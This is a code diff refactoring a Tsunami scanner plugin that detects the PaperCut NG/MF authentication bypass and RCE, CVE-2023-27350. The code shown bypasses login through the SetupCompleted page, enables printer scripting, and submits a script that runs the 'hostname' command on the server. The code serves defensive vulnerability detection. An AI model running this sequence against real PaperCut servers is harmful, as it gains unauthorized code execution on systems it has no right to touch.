@@ -22,14 +22,24 @@ import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
-import com.google.tsunami.common.net.http.*;
+import com.google.tsunami.common.net.http.HttpClient;
+import com.google.tsunami.common.net.http.HttpResponse;
+import com.google.tsunami.common.net.http.HttpStatus;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
-import com.google.tsunami.proto.*;
+import com.google.tsunami.proto.DetectionReport;
+import com.google.tsunami.proto.DetectionReportList;
+import com.google.tsunami.proto.DetectionStatus;
+import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
+import com.google.tsunami.proto.Severity;
+import com.google.tsunami.proto.TargetInfo;
+import com.google.tsunami.proto.Vulnerability;
+import com.google.tsunami.proto.VulnerabilityId;
 import java.time.Clock;
 import java.time.Instant;
 import java.util.HashMap;
@@ -37,14 +47,15 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javax.inject.Inject;
 
+/** A VulnDetector plugin to for CVE-2023-27350. */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
-    name = "PapercutNGMRVulnDetectorWithPayload",
+    name = "PapercutNgMfVulnDetector",
     version = "1.0",
     description = "Detects papercut versions that are vulnerable to authentication bypass and RCE.",
     author = "Isaac_GC (isaac@nu-that.us)",
-    bootstrapModule = PapercutNGMFVulnDetectorWithPayloadBootstrapModule.class)
-public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
+    bootstrapModule = PapercutNgMfVulnDetectorBootstrapModule.class)
+public final class PapercutNgMfVulnDetector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
   private final Clock utcClock;
@@ -52,7 +63,7 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
   private final PayloadGenerator payloadGenerator;
 
   @Inject
-  PapercutNGMFVulnDetectorWithPayload(
+  PapercutNgMfVulnDetector(
       @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
@@ -77,7 +88,7 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
   private boolean isServiceVulnerable(NetworkService networkService) {
     boolean isVulnerable = false;
 
-    PapercutNGMFHelper helper = new PapercutNGMFHelper(networkService, logger, this.httpClient);
+    PapercutNgMfHelper helper = new PapercutNgMfHelper(networkService, this.httpClient);
 
     HttpResponse response = helper.sendGetRequest("service=page/SetupCompleted");
     Matcher bodyContentMatcher =
@@ -87,7 +98,7 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
     // If all initial checks pass, then lets check the RCE vuln
     if (response.status() == HttpStatus.OK
         && bodyContentMatcher.find()
-        && !helper.JSESSION_ID.isEmpty()) {
+        && !helper.jsessionId.isEmpty()) {
 
       // SetupCompleted payload/page
       HashMap<String, String> setupCompletedPage = new HashMap<String, String>();
@@ -99,7 +110,6 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
 
       // Post/send above params
       helper.sendPostRequest(helper.buildParameterString(setupCompletedPage));
-      //      helper.sendGetRequest("service=page/Dashboard");
 
       // Changing (or attempting to) change the settings required for RCE
       helper.changeSettingForPayload("print-and-device.script.enable", true);
@@ -159,8 +169,7 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
             "scriptBody",
             "function printJobHook(inputs, actions) {}\r\n"
                 + "java.lang.Runtime.getRuntime().exec('hostname');"); // If we can even do this,
-        // that's all we really can
-        // do
+        // that's all we really can do
         printerScriptPayload.put("$Submit$1", "Apply");
 
         // Sending payload
